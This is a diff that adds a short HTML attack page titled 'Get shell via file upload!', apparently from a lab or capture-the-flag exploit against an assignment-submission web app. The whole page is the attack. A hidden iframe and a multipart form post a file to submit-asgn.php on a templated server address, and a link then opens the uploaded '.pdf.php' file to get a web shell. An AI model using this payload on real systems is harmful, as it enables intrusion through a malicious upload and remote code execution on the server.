@@ -1,0 +1,18 @@
+<html>
+  
+<body>
+  <h1>Get shell via file upload!</h1>
+  
+<iframe style="display:none" name="csrf-frame"></iframe>
+<form method="POST" action="http://{server_ip}/submit-asgn.php?asgn=1" target="csrf-frame" id="csrf-form" enctype="multipart/form-data">
+  <input type="file" name="handin"/>
+  <input type="submit" value="Submit">
+</form>
+
+<a href="http://{server_ip}/handins/{handin_hash}.pdf.php">Go to assignment "cryptography" for shell!</a>
+
+</body>
+</html>
+
+
+ 
